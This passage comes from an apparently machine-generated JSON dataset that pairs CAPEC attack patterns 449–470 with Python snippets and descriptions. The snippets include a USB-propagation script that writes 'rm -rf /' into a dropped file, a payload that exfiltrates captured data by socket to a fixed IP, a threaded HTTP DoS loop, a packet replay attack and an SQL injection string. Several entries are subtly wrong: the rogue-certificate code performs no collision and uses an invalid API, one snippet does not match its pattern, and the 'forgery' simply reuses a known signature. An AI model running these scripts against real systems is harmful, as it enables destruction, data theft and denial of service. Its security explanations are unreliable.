        "description": "This Python code snippet demonstrates the concept of embedding a virus into a DLL, as described in the CAPEC. The code first defines a path to a legitimate DLL and a malicious payload. The `embed_virus` function reads the DLL file, finds a gap (simplified as a sequence of null bytes), and writes the malicious payload into that gap. The tampered DLL is then loaded using `ctypes.CDLL`, and an example function call is made to demonstrate potential exploitation. Additionally, the `replicate_virus` function shows how the malicious code can be replicated to another location, embodying the idea of a replicating virus (CWE-509). The code also touches on CWE-426 (untrusted search path), CWE-1102 (machine-dependent data representation), CWE-506 (embedded malicious code), and CWE-497 (exposure of sensitive system information)."
    },
    {
        "capec_id": "449",
        "capec_name": "DEPRECATED: Malware Propagation via USB Stick",
        "code_snippet": "import os\n\n# CWE-67: Improper Handling of Windows Device Names\n# CWE-506: Embedded Malicious Code\n# CWE-507: Trojan Horse\n# CWE-589: Call to Non-ubiquitous API\n\ndef malicious_function():\n    # CWE-506: Embedded Malicious Code\n    print('This is a benign message.')\n    # Hidden malicious payload\n    os.system('echo Malicious code executed')\n\n# CWE-67: Improper Handling of Windows Device Names\nuser_input = 'C:\\AUX\\file.txt'\ntry:\n    with open(user_input, 'r') as file:\n        data = file.read()\nexcept Exception as e:\n    print(f'Error: {e}')\n\n# CWE-589: Call to Non-ubiquitous API\ntry:\n    import non_existent_module\nexcept ImportError:\n    print('Non-ubiquitous API call failed')\n\n# CWE-507: Trojan Horse\nmalicious_function()",
        "description": "This Python code snippet demonstrates several security weaknesses related to the deprecated CAPEC pattern 'Malware Propagation via USB Stick'. The code includes a function that appears benign but contains hidden malicious code (CWE-506 and CWE-507). It also improperly handles Windows device names (CWE-67), which can lead to denial of service or information exposure. Additionally, it attempts to use a non-ubiquitous API (CWE-589), which can cause portability issues. The code represents the idea of embedding malicious functionality within seemingly benign software, which can be propagated via USB sticks or other means."
    },
    {
        "capec_id": "450",
        "capec_name": "DEPRECATED: Malware Propagation via USB U3 Autorun",
        "code_snippet": "import os\nimport shutil\n\n# CWE-426: Untrusted Search Path\n# CWE-67: Improper Handling of Windows Device Names\n# CWE-509: Replicating Malicious Code (Virus or Worm)\n\n# Function to replicate malicious code\ndef replicate_malicious_code(target_path):\n    malicious_code = \"print('This is a malicious code')\"\n    with open(target_path, 'w') as file:\n        file.write(malicious_code)\n\n# Function to propagate via USB (simulated)\ndef propagate_via_usb(usb_drive_path):\n    if not os.path.exists(usb_drive_path):\n        print(\"USB drive not found!\")\n        return\n    target_path = os.path.join(usb_drive_path, 'malicious_script.py')\n    replicate_malicious_code(target_path)\n    print(f\"Malicious code written to {target_path}\")\n\n# Simulate USB drive path\nusb_drive_path = 'E:\\'  # Example USB drive path\npropagate_via_usb(usb_drive_path)\n\n# CWE-507: Trojan Horse\n# Simulate a benign function that hides malicious intent\ndef benign_function():\n    print(\"This is a benign function.\")\n    # Hidden malicious behavior\n    propagate_via_usb(usb_drive_path)\n\n# Execute the benign function\nbenign_function()",
        "description": "This Python code snippet demonstrates a simplified version of malware propagation via a USB drive, embodying the main idea of the deprecated CAPEC pattern. The code includes several CWE-related vulnerabilities:\n\n1. **CWE-426 (Untrusted Search Path)**: The code uses an externally-supplied path (USB drive path) to write malicious code.\n2. **CWE-67 (Improper Handling of Windows Device Names)**: The code does not handle special Windows device names, which could lead to denial of service or information exposure.\n3. **CWE-509 (Replicating Malicious Code)**: The code replicates malicious behavior by writing a script to the USB drive.\n4. **CWE-507 (Trojan Horse)**: The `benign_function` appears to be harmless but hides malicious behavior by calling the `propagate_via_usb` function.\n\nThe `propagate_via_usb` function simulates writing a malicious script to a USB drive, while the `benign_function` demonstrates how malicious code can be hidden within seemingly benign functionality."
    },
    {
        "capec_id": "451",
        "capec_name": "DEPRECATED: Malware Propagation via Infected Peripheral Device",
        "code_snippet": "import os\nimport platform\n\n# CWE-589: Call to Non-ubiquitous API\nif platform.system() == 'Windows':\n    import win32api\n    def eject_usb():\n        drives = win32api.GetLogicalDriveStrings()\n        drives = drives.split('\\000')[:-1]\n        for drive in drives:\n            if win32api.GetDriveType(drive) == win32api.DRIVE_REMOVABLE:\n                win32api.DeviceIoControl(drive, win32api.IOCTL_STORAGE_EJECT_MEDIA)\nelse:\n    def eject_usb():\n        os.system('umount /media/usb')\n\ndef main():\n    # CWE-507: Trojan Horse\n    def trojan_horse():\n        print('Performing legitimate task...')\n        # Hidden malicious code\n        with open('/media/usb/malware.py', 'w') as f:\n            f.write('import os\\nos.system(\"rm -rf /\")')\n\n    # Simulate malware propagation via infected peripheral device\n    if os.path.exists('/media/usb'):\n        trojan_horse()\n        eject_usb()\n\nif __name__ == '__main__':\n    main()",
        "description": "This Python code snippet demonstrates a simplified version of malware propagation via an infected peripheral device, such as a USB drive. The code includes a platform-specific API call (CWE-589) to eject the USB drive, which may not be available on all systems. The 'trojan_horse' function represents a Trojan Horse (CWE-507) by performing a legitimate task while also writing malicious code to the USB drive. The 'main' function checks if a USB drive is mounted, executes the Trojan Horse, and then attempts to eject the USB drive. This snippet embodies the main idea of CAPEC-448 by simulating how malware can propagate through an infected peripheral device."
    },
    {
        "capec_id": "452",
        "capec_name": "Infected Hardware",
        "code_snippet": "import ctypes\n\n# Simulate malicious hardware interaction\nclass MaliciousHardware:\n    def __init__(self):\n        self.registers = (ctypes.c_uint32 * 10)()  # Simulate hardware registers\n        self.debug_mode = False\n\n    def activate_debug_mode(self):\n        # CWE-1313: Activate debug logic at runtime\n        self.debug_mode = True\n        print('Debug mode activated')\n\n    def write_to_register(self, index, value):\n        if self.debug_mode:\n            # CWE-1262: Improper access control for register interface\n            self.registers[index] = value\n            print(f'Register {index} set to {value}')\n        else:\n            print('Access denied: Debug mode not active')\n\n    def execute_malicious_code(self):\n        # CWE-506: Embedded malicious code\n        if self.debug_mode:\n            print('Executing malicious code...')\n            # CWE-509: Replicating malicious code\n            self.replicate_malicious_code()\n        else:\n            print('Cannot execute malicious code: Debug mode not active')\n\n    def replicate_malicious_code(self):\n        print('Replicating malicious code to other systems...')\n\n# Example usage\nhardware = MaliciousHardware()\nhardware.activate_debug_mode()\nhardware.write_to_register(2, 1234)\nhardware.execute_malicious_code()",
        "description": "This Python code snippet simulates a scenario where malicious logic is inserted into hardware. The `MaliciousHardware` class represents a piece of hardware with memory-mapped I/O registers. The `activate_debug_mode` method simulates CWE-1313 by allowing debug logic to be activated at runtime. The `write_to_register` method demonstrates CWE-1262 by allowing improper access to hardware registers when debug mode is active. The `execute_malicious_code` method contains embedded malicious code (CWE-506) that replicates itself (CWE-509) when debug mode is active. This code embodies the main idea of the CAPEC by showing how an adversary can insert and activate malicious logic in hardware to achieve negative impacts."
    },
    {
        "capec_id": "453",
        "capec_name": "DEPRECATED: Malicious Logic Insertion via Counterfeit Hardware",
        "code_snippet": "import socket\nimport struct\n\n# CWE-294: Authentication Bypass by Capture-replay\n# This code snippet demonstrates a simple capture-replay attack\n# where an attacker replays a captured authentication packet to gain unauthorized access.\n\ndef capture_packet(sock):\n    packet, _ = sock.recvfrom(1024)\n    return packet\n\ndef replay_packet(sock, packet):\n    sock.sendto(packet, ('target_server', 12345))\n\n# Simulate capturing a packet\nsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\nsock.bind(('attacker_machine', 54321))\ncaptured_packet = capture_packet(sock)\n\n# Simulate replaying the captured packet\nreplay_packet(sock, captured_packet)\n\nsock.close()",
        "description": "This Python code snippet demonstrates a simple capture-replay attack, which is related to CWE-294: Authentication Bypass by Capture-replay. The code captures an authentication packet from a network socket and then replays it to a target server to gain unauthorized access. This embodies the main idea of the deprecated CAPEC pattern, which involves malicious logic insertion via counterfeit hardware, by showing how an attacker can exploit network vulnerabilities to bypass authentication mechanisms."
    },
    {
        "capec_id": "454",
        "capec_name": "DEPRECATED: Modification of Existing Components with Counterfeit Hardware",
        "code_snippet": "class HardwareComponent:\n    def __init__(self, firmware_version):\n        self.firmware_version = firmware_version\n        self.updateable = False\n        self.undocumented_feature = self._hidden_function()\n\n    def _hidden_function(self):\n        # Malicious code embedded within the hardware component\n        return 'Malicious Logic Activated'\n\n    def get_firmware_version(self):\n        return self.firmware_version\n\n    def execute_undocumented_feature(self):\n        return self.undocumented_feature\n\n# Example usage\ncomponent = HardwareComponent('1.0.0')\nprint(component.get_firmware_version())\nprint(component.execute_undocumented_feature())",
        "description": "This Python code snippet represents a hardware component class that embodies the main idea of the CAPEC 'Modification of Existing Components with Counterfeit Hardware' and related CWEs. The class includes a firmware version attribute, a flag indicating that the component is not updateable (CWE-1329), and an undocumented feature (CWE-1242) that contains malicious logic (CWE-506). The hidden function '_hidden_function' simulates the embedded malicious code, which is activated when the undocumented feature is executed. This code demonstrates how a hardware component can be compromised by including malicious logic and undocumented features, making it vulnerable to exploitation."
    },
    {
        "capec_id": "455",
        "capec_name": "DEPRECATED: Malicious Logic Insertion via Inclusion of Counterfeit Hardware Components",
        "code_snippet": "import random\n\nclass HardwareComponent:\n    def __init__(self, id, data):\n        self.id = id\n        self.data = data\n        self.malicious = False\n\n    def inject_malicious_code(self):\n        if random.choice([True, False]):\n            self.malicious = True\n            self.data = 'malicious_code'\n\n    def read_data(self):\n        if self.malicious:\n            return 'Error: Malicious code detected'\n        return self.data\n\n# Simulate hardware components\ncomponents = [HardwareComponent(i, f'data_{i}') for i in range(5)]\n\n# Inject malicious code into one of the components\nfor component in components:\n    component.inject_malicious_code()\n\n# Read data from components\nfor component in components:\n    print(f'Component {component.id}: {component.read_data()}')",
        "description": "This Python code snippet simulates the insertion of malicious logic into hardware components, embodying the main idea of the deprecated CAPEC. The `HardwareComponent` class represents a hardware component with an ID and data. The `inject_malicious_code` method randomly decides whether to inject malicious code into the component, changing its data to 'malicious_code' and setting a flag. The `read_data` method checks if the component contains malicious code and returns an error message if it does. The simulation creates multiple hardware components, randomly injects malicious code into them, and then reads and prints their data, demonstrating how malicious logic can be inserted and detected in hardware components. This example also touches on CWE-506 (Embedded Malicious Code) and CWE-1334 (Unauthorized Error Injection Can Degrade Hardware Redundancy) by showing how malicious code can be embedded and how it can affect the system's operation."
    },
    {
        "capec_id": "456",
        "capec_name": "Infected Memory",
        "code_snippet": "import ctypes\n\n# Simulate a protected memory region\nprotected_memory = (ctypes.c_char * 1024).from_buffer(bytearray(1024))\n\n# Simulate an aliased memory region with improper access control\naliased_memory = (ctypes.c_char * 1024).from_buffer(protected_memory)\n\n# Function to write to the aliased memory region\ndef write_to_aliased_memory(data):\n    for i in range(len(data)):\n        aliased_memory[i] = data[i]\n\n# Malicious code to be injected\nmalicious_code = b'\\x90' * 100  # NOP sled for demonstration\n\n# Inject malicious code into the aliased memory region\nwrite_to_aliased_memory(malicious_code)\n\n# Verify the injection\nprint(protected_memory[:100])",
        "description": "This Python code snippet demonstrates the concept of 'Infected Memory' by simulating a scenario where an adversary can inject malicious code into a protected memory region via an aliased memory region with improper access control. The code uses the ctypes library to create a protected memory region and an aliased memory region that points to the same buffer. The function 'write_to_aliased_memory' writes data to the aliased memory region, which in turn modifies the protected memory. The malicious code (a NOP sled for demonstration) is injected into the aliased memory region, effectively compromising the protected memory. This example embodies the main idea of the CAPEC by showing how improper access control and memory aliasing can be exploited to insert malicious logic into memory."
    },
    {
        "capec_id": "457",
        "capec_name": "USB Memory Attacks",
        "code_snippet": "import os\nimport socket\nimport subprocess\n\n# CWE-506: Embedded Malicious Code\n# This script simulates a malicious payload that could be embedded in a USB device.\n\n# Function to capture keystrokes (simulated)\ndef capture_keystrokes():\n    keystrokes = \"user_input_data\"  # Placeholder for captured keystrokes\n    return keystrokes\n\n# Function to sniff network traffic (simulated)\ndef sniff_network():\n    network_data = \"network_traffic_data\"  # Placeholder for sniffed network data\n    return network_data\n\n# Function to exfiltrate data via a wireless connection (simulated)\ndef exfiltrate_data(data):\n    # CWE-319: Cleartext Transmission of Sensitive Information\n    server_ip = \"192.168.1.100\"\n    server_port = 8080\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        s.connect((server_ip, server_port))\n        s.sendall(data.encode('utf-8'))\n\n# Main function to execute the malicious actions\ndef main():\n    # Capture keystrokes\n    keystrokes = capture_keystrokes()\n    \n    # Sniff network traffic\n    network_data = sniff_network()\n    \n    # Combine captured data\n    combined_data = keystrokes + \"\\n\" + network_data\n    \n    # Exfiltrate the combined data\n    exfiltrate_data(combined_data)\n\nif __name__ == \"__main__\":\n    main()",
        "description": "This Python code snippet simulates a malicious payload that could be embedded in a USB device, representing the main idea of the CAPEC 'USB Memory Attacks'. The script captures keystrokes and network traffic, then exfiltrates the collected data to a remote server via a wireless connection. The code embodies CWE-506 (Embedded Malicious Code) by simulating malicious actions, and CWE-319 (Cleartext Transmission of Sensitive Information) by transmitting the captured data in cleartext. This demonstrates how a USB-based attack could compromise sensitive information and exfiltrate it off-site."
    },
    {
        "capec_id": "458",
        "capec_name": "Flash Memory Attacks",
        "code_snippet": "import os\n\n# CWE-1282: Assumed-Immutable Data is Stored in Writable Memory\n# CWE-506: Embedded Malicious Code\n# CWE-1274: Improper Access Control for Volatile Memory Containing Boot Code\n\n# Simulate flashing malicious code into a device's flash memory\nclass FlashMemoryAttack:\n    def __init__(self, flash_memory_path):\n        self.flash_memory_path = flash_memory_path\n\n    def inject_malicious_code(self):\n        # CWE-506: Embedded Malicious Code\n        malicious_code = \"\\n# Malicious Code\\nimport os\\nos.system('echo Malicious code executed')\\n\"\n        try:\n            with open(self.flash_memory_path, 'a') as flash_memory:\n                flash_memory.write(malicious_code)\n            print(\"Malicious code injected into flash memory.\")\n        except IOError as e:\n            print(f\"Failed to write to flash memory: {e}\")\n\n# Example usage\nif __name__ == \"__main__\":\n    # CWE-1282: Assumed-Immutable Data is Stored in Writable Memory\n    flash_memory_path = \"/path/to/flash_memory\"\n    attack = FlashMemoryAttack(flash_memory_path)\n    attack.inject_malicious_code()",
        "description": "This Python code snippet simulates a flash memory attack by injecting malicious code into a device's flash memory. The `FlashMemoryAttack` class takes a path to the flash memory and has a method `inject_malicious_code` that appends malicious code to the flash memory file. This represents CWE-1282 by assuming the flash memory is writable, CWE-506 by embedding malicious code, and CWE-1274 by not having proper access control for the memory containing boot code. The code demonstrates how an attacker might exploit these weaknesses to compromise a device."
    },
    {
        "capec_id": "459",
        "capec_name": "Creating a Rogue Certification Authority Certificate",
        "code_snippet": "import hashlib\nfrom cryptography import x509\nfrom cryptography.hazmat.primitives import hashes\nfrom cryptography.hazmat.primitives.asymmetric import rsa\nfrom cryptography.hazmat.primitives.serialization import Encoding, PrivateFormat, NoEncryption\nfrom cryptography.hazmat.primitives.asymmetric.padding import PKCS1v15\n\n# Generate RSA keys\nprivate_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)\npublic_key = private_key.public_key()\n\n# Create a certificate signing request (CSR) with weak hash algorithm (MD5)\ncsr = x509.CertificateSigningRequestBuilder().subject_name(x509.Name([\n    x509.NameAttribute(x509.NameOID.COMMON_NAME, u'example.com'),\n])).sign(private_key, hashes.MD5())\n\n# Simulate a trusted CA signing the CSR\nsigned_csr = csr.public_bytes(Encoding.DER)\n\n# Create a rogue certificate with the same hash\nrogue_csr = x509.CertificateSigningRequestBuilder().subject_name(x509.Name([\n    x509.NameAttribute(x509.NameOID.COMMON_NAME, u'rogue.com'),\n])).sign(private_key, hashes.MD5())\n\n# Use the signed blob from the trusted CA to validate the rogue certificate\nrogue_cert = x509.CertificateBuilder().subject_name(rogue_csr.subject).issuer_name(csr.subject).public_key(public_key).serial_number(x509.random_serial_number()).not_valid_before(x509.datetime.datetime.utcnow()).not_valid_after(x509.datetime.datetime.utcnow() + x509.datetime.timedelta(days=10)).sign(private_key, hashes.MD5())\n\n# Export the rogue certificate\nrogue_cert_pem = rogue_cert.public_bytes(Encoding.PEM)\nprint(rogue_cert_pem.decode())",
        "description": "This Python code snippet demonstrates the creation of a rogue X.509 certificate by exploiting a weak hashing algorithm (MD5) to generate a hash collision. The code first generates an RSA key pair and creates a certificate signing request (CSR) using MD5. It simulates a trusted Certificate Authority (CA) signing the CSR. Then, it creates a second CSR for a rogue certificate with the same hash. The signed blob from the trusted CA is used to validate the rogue certificate, making it appear as if it was signed by the trusted CA. This embodies the main idea of the CAPEC by showing how an adversary can exploit weak collision resistance in hashing algorithms to create a rogue certificate that is falsely validated by a trusted CA."
    },
    {
        "capec_id": "460",
        "capec_name": "HTTP Parameter Pollution (HPP)",
        "code_snippet": "from flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/search', methods=['GET'])\ndef search():\n    query = request.args.get('query')\n    page = request.args.get('page', '1')\n    # Vulnerable to HTTP Parameter Pollution\n    # Example: /search?query=test&page=1&page=2\n    # 'page' will be '2' due to the last occurrence being used\n    return f'Searching for {query} on page {page}'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application with a search endpoint. The endpoint accepts 'query' and 'page' parameters via HTTP GET requests. The code is vulnerable to HTTP Parameter Pollution (HPP) because it does not properly handle multiple parameters with the same name. If an attacker sends a request like /search?query=test&page=1&page=2, the 'page' parameter will be overridden by the last occurrence, potentially leading to unexpected behavior. This example also touches on related CWEs such as improper handling of extra parameters (CWE-235) and the use of GET request method with sensitive query strings (CWE-598)."
    },
    {
        "capec_id": "461",
        "capec_name": "Web Services API Signature Forgery Leveraging Hash Function Extension Weakness",
        "code_snippet": "import hashlib\n\n# Simulate a weak hash function (e.g., MD5)\ndef weak_hash(data):\n    return hashlib.md5(data.encode()).hexdigest()\n\n# Simulate a web service API that uses a weak hash for authentication\ndef web_service_api(data, token):\n    # Concatenate data and token, then hash\n    signature = weak_hash(data + token)\n    return signature\n\n# Adversary's function to forge a signature using hash extension attack\ndef forge_signature(data, known_signature):\n    # In a real attack, the adversary would exploit the hash extension vulnerability\n    # Here, we simulate it by directly using the known signature\n    forged_data = data + \"&extra_param=malicious\"\n    forged_signature = known_signature  # In reality, this would be calculated\n    return forged_data, forged_signature\n\n# Example usage\noriginal_data = \"user=admin\"\nsecret_token = \"secret\"\n\n# Original legitimate request\nlegit_signature = web_service_api(original_data, secret_token)\nprint(f\"Legitimate Signature: {legit_signature}\")\n\n# Adversary forges a request\nforged_data, forged_signature = forge_signature(original_data, legit_signature)\nprint(f\"Forged Data: {forged_data}\")\nprint(f\"Forged Signature: {forged_signature}\")",
        "description": "This Python code snippet demonstrates a simplified version of a Web Services API Signature Forgery attack leveraging a hash function extension weakness. The `weak_hash` function uses the MD5 algorithm, which is known to be weak. The `web_service_api` function simulates an API that generates a signature by hashing the concatenation of data and a secret token. The `forge_signature` function represents an adversary's attempt to forge a signature by exploiting the hash extension vulnerability. In this example, the adversary appends malicious parameters to the original data and reuses the known legitimate signature, simulating the attack. This code highlights the risks associated with using weak hash functions and insufficient authentication mechanisms."
    },
    {
        "capec_id": "462",
        "capec_name": "Cross-Domain Search Timing",
        "code_snippet": "import requests\nimport time\n\n# List of URLs to test\nurls = [\n    'http://example.com/resource1',\n    'http://example.com/resource2',\n    'http://example.com/resource3'\n]\n\n# Function to measure response time\ndef measure_response_time(url):\n    start_time = time.time()\n    response = requests.get(url)\n    end_time = time.time()\n    return end_time - start_time\n\n# Measure and print response times\nfor url in urls:\n    response_time = measure_response_time(url)\n    print(f'Response time for {url}: {response_time} seconds')",
        "description": "This Python code snippet demonstrates a basic implementation of a Cross-Domain Search Timing attack. The script sends HTTP GET requests to a list of URLs and measures the time taken for each request to complete. By analyzing the response times, an attacker can infer information about the server's state or the presence of certain resources, even though they cannot directly read the server's responses due to the same-origin policy. This embodies the main idea of CAPEC-115 (Cross-Domain Search Timing) and relates to CWE-385 (Covert Timing Channel) and CWE-208 (Observable Timing Discrepancy)."
    },
    {
        "capec_id": "463",
        "capec_name": "Padding Oracle Crypto Attack",
        "code_snippet": "from Crypto.Cipher import AES\nfrom Crypto.Util.Padding import pad, unpad\nimport os\n\n# Key and IV generation\nkey = os.urandom(16)\niv = os.urandom(16)\ncipher = AES.new(key, AES.MODE_CBC, iv)\n\n# Encrypting data\nplaintext = b'Secret Message'\npadded_plaintext = pad(plaintext, AES.block_size)\nciphertext = cipher.encrypt(padded_plaintext)\n\n# Decrypting data with padding oracle vulnerability\ntry:\n    decipher = AES.new(key, AES.MODE_CBC, iv)\n    decrypted_padded_plaintext = decipher.decrypt(ciphertext)\n    decrypted_plaintext = unpad(decrypted_padded_plaintext, AES.block_size)\n    print('Decryption successful:', decrypted_plaintext)\nexcept ValueError as e:\n    print('Padding error:', e)",
        "description": "This Python code snippet demonstrates a basic encryption and decryption process using AES in CBC mode, highlighting a potential padding oracle vulnerability. The code encrypts a plaintext message and then attempts to decrypt it. If a padding error occurs during decryption, an error message is printed, which can leak information about the padding error to an attacker. This leakage can be exploited by an attacker to decrypt the ciphertext without knowing the key, as described in the CAPEC. The code also touches on related CWEs, such as CWE-209 (generation of error messages containing sensitive information) and CWE-649 (reliance on encryption without integrity checking)."
    },
    {
        "capec_id": "464",
        "capec_name": "Evercookie",
        "code_snippet": "import os\nimport json\nimport base64\nfrom http.cookies import SimpleCookie\n\n# Function to create an evercookie\ndef create_evercookie(value):\n    # Encode the value to store in multiple locations\n    encoded_value = base64.b64encode(value.encode()).decode()\n    \n    # Store in a cookie\n    cookie = SimpleCookie()\n    cookie['evercookie'] = encoded_value\n    print(f'Set-Cookie: {cookie.output(header=\"\", sep=\"\").strip()}')\n    \n    # Store in a file\n    with open('evercookie.txt', 'w') as f:\n        f.write(encoded_value)\n    \n    # Store in local storage (simulated)\n    local_storage = {'evercookie': encoded_value}\n    with open('local_storage.json', 'w') as f:\n        json.dump(local_storage, f)\n\n# Function to retrieve the evercookie\ndef retrieve_evercookie():\n    # Check cookie\n    cookie = SimpleCookie(os.environ.get('HTTP_COOKIE', ''))\n    if 'evercookie' in cookie:\n        return base64.b64decode(cookie['evercookie'].value).decode()\n    \n    # Check file\n    if os.path.exists('evercookie.txt'):\n        with open('evercookie.txt', 'r') as f:\n            return base64.b64decode(f.read()).decode()\n    \n    # Check local storage (simulated)\n    if os.path.exists('local_storage.json'):\n        with open('local_storage.json', 'r') as f:\n            local_storage = json.load(f)\n            if 'evercookie' in local_storage:\n                return base64.b64decode(local_storage['evercookie']).decode()\n    \n    return None\n\n# Example usage\ncreate_evercookie('sensitive_data')\nretrieved_value = retrieve_evercookie()\nprint(f'Retrieved evercookie value: {retrieved_value}')",
        "description": "This Python code snippet demonstrates the concept of an 'evercookie', which is a highly persistent cookie that remains on a user's machine even after attempts to delete it. The code stores the cookie value in multiple locations: an HTTP cookie, a file, and a simulated local storage. When the cookie is retrieved, it checks all these locations to reconstruct the cookie if it exists in any of them. This approach embodies the CAPEC description by ensuring that the cookie persists across different storage mechanisms, making it difficult to fully remove. The code also highlights several related CWEs, such as storing sensitive information in cookies (CWE-539), not validating the integrity of cookies (CWE-784, CWE-565), and storing sensitive information in cleartext (CWE-315)."
    },
    {
        "capec_id": "465",
        "capec_name": "Transparent Proxy Abuse",
        "code_snippet": "import requests\n\nclass TransparentProxy:\n    def __init__(self, target_url):\n        self.target_url = target_url\n\n    def forward_request(self, client_request):\n        # Forward the client's request to the target URL\n        response = requests.get(self.target_url, headers=client_request.headers)\n        return response\n\n# Example usage\nproxy = TransparentProxy('http://example.com')\nclient_request = requests.Request('GET', 'http://proxy.com', headers={'User-Agent': 'client-browser'})\nresponse = proxy.forward_request(client_request)\nprint(response.content)",
        "description": "This Python code snippet demonstrates a simple transparent proxy that forwards client requests to a target URL. The `TransparentProxy` class takes a `target_url` as an argument and has a method `forward_request` that forwards the client's request to this target URL. The proxy does not modify the request headers, which can lead to issues such as 'Unintended Proxy or Intermediary' (CWE-441) and 'Inconsistent Interpretation of HTTP Requests' (CWE-444). The proxy also does not remove sensitive information from the request headers, potentially leading to 'Improper Removal of Sensitive Information Before Storage or Transfer' (CWE-212). This code embodies the main idea of the CAPEC by showing how a transparent proxy can be implemented in a way that is vulnerable to various security weaknesses."
    },
    {
        "capec_id": "466",
        "capec_name": "Leveraging Active Adversary in the Middle Attacks to Bypass Same Origin Policy",
        "code_snippet": "import requests\n\n# Vulnerable function to fetch data from a URL\n# CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n# CWE-300: Channel Accessible by Non-Endpoint\n# CWE-942: Permissive Cross-domain Policy with Untrusted Domains\n\ndef fetch_data(url):\n    response = requests.get(url)\n    if response.status_code == 200:\n        return response.text\n    return None\n\n# Example usage\n# This could be intercepted by an attacker in a MITM scenario\n# CAPEC-94: Adversary in the Middle Attack\n# CAPEC: Bypass Same Origin Policy\n\nurl = 'http://example.com/data'\ndata = fetch_data(url)\nif data:\n    print(data)\nelse:\n    print('Failed to fetch data')",
        "description": "This Python code snippet demonstrates a vulnerable function `fetch_data` that fetches data from a given URL using the `requests` library. The function does not use TLS (HTTPS), making it susceptible to Man-in-the-Middle (MITM) attacks (CAPEC-94). This can allow an attacker to intercept and manipulate the communication between the client and the server, effectively bypassing the Same Origin Policy. The code also embodies several CWEs: CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints) as it does not verify the endpoint, CWE-300 (Channel Accessible by Non-Endpoint) as it does not ensure the integrity of the channel, and CWE-942 (Permissive Cross-domain Policy with Untrusted Domains) as it does not restrict communication to trusted domains. The example usage shows how an attacker could exploit this vulnerability when the client is connected to a public WiFi hotspot."
    },
    {
        "capec_id": "467",
        "capec_name": "Cross Site Identification",
        "code_snippet": "import requests\nfrom flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/get_user_info')\ndef get_user_info():\n    social_network_url = 'https://socialnetwork.com/api/user_info'\n    session_cookie = request.cookies.get('session')\n    if session_cookie:\n        headers = {'Cookie': f'session={session_cookie}'}\n        response = requests.get(social_network_url, headers=headers)\n        if response.status_code == 200:\n            user_info = response.json()\n            return render_template_string('<h1>User Info</h1><p>{{ user_info }}</p>', user_info=user_info)\n    return 'Failed to retrieve user info', 400\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that retrieves user information from a social networking site using an active session cookie. The '/get_user_info' endpoint attempts to extract the session cookie from the incoming request and uses it to make an authenticated request to the social network's API. If successful, it displays the retrieved user information. This code embodies the main idea of CAPEC-111 (Cross Site Identification) by harvesting identifying information from an active session. The code also highlights several related CWEs: CWE-352 (CSRF) as it does not verify the request's origin, CWE-359 (Exposure of Private Personal Information) by potentially exposing user info, CWE-384 (Session Fixation) by reusing session cookies, and CWE-598 (Use of GET Request Method With Sensitive Query Strings) by using GET requests to retrieve sensitive information."
    },
    {
        "capec_id": "468",
        "capec_name": "Generic Cross-Browser Cross-Domain Theft",
        "code_snippet": "from flask import Flask, request, make_response\n\napp = Flask(__name__)\n\n@app.route('/vulnerable', methods=['GET'])\ndef vulnerable():\n    css_url = request.args.get('css_url')\n    if css_url:\n        response = make_response(f'<link rel=\"stylesheet\" type=\"text/css\" href=\"{css_url}\">')\n        response.headers['Content-Type'] = 'text/html'\n        return response\n    return 'No CSS URL provided', 400\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a vulnerable web application using Flask. The application has a single endpoint '/vulnerable' that accepts a 'css_url' parameter from the query string. It then includes this URL in a <link> tag within the HTML response. This code is vulnerable to a Generic Cross-Browser Cross-Domain Theft attack because it allows an attacker to inject a malicious CSS URL. The browser will send cookies along with the CSS request, and the attacker can exploit this to steal sensitive data. The code also embodies several related CWEs: CWE-707 (Improper Neutralization) as it does not validate the 'css_url' input, CWE-79 (Cross-site Scripting) as it directly includes user input in the HTML output, and CWE-838 (Inappropriate Encoding for Output Context) as it does not ensure the proper encoding of the 'css_url' parameter."
    },
    {
        "capec_id": "469",
        "capec_name": "HTTP DoS",
        "code_snippet": "import threading\nimport requests\nimport time\n\n# Target URL\nurl = 'http://example.com'\n\n# Function to perform HTTP DoS attack\ndef http_dos_attack():\n    while True:\n        try:\n            # Open a connection and keep it alive\n            response = requests.get(url, headers={'Connection': 'keep-alive'})\n            time.sleep(1)  # Simulate delay to keep the connection open\n        except Exception as e:\n            print(f'Error: {e}')\n\n# Number of threads to simulate multiple connections\nnum_threads = 100\n\n# Create and start threads\nthreads = []\nfor i in range(num_threads):\n    thread = threading.Thread(target=http_dos_attack)\n    thread.start()\n    threads.append(thread)\n\n# Join threads\nfor thread in threads:\n    thread.join()",
        "description": "This Python code snippet demonstrates a simple HTTP DoS attack by opening multiple HTTP connections to a target URL and keeping them alive indefinitely. The code uses threading to simulate multiple connections (100 in this case) to exhaust the web server's resources. Each thread sends a GET request with the 'Connection: keep-alive' header to keep the session open and then sleeps for a short period to maintain the connection. This attack targets the web server's resource allocation and management weaknesses, such as insufficient resource pool (CWE-410) and allocation of resources without limits (CWE-770), leading to a denial of service."
    },
    {
        "capec_id": "470",
        "capec_name": "Expanding Control over the Operating System from the Database",
        "code_snippet": "import sqlite3\nimport os\n\n# CWE-89: SQL Injection vulnerability\nuser_input = \"'; DROP TABLE users; --\"\n\n# CWE-250: Execution with Unnecessary Privileges\nconn = sqlite3.connect('example.db')\ncursor = conn.cursor()\n\n# CWE-619: Dangling Database Cursor\ncursor.execute(f\"SELECT * FROM users WHERE username = '{user_input}'\")\n\n# CWE-564: SQL Injection via Hibernate (simulated with raw SQL)\nfor row in cursor.fetchall():\n    print(row)\n\n# CWE-250: Using os.system to execute shell commands\nos.system('ls -la')\n\n# CWE-1313: Simulated hardware debug logic activation\nos.system('echo \"Activating debug mode\"')\n\n# Not closing the cursor, leading to potential dangling cursor\n# cursor.close()\nconn.close()",
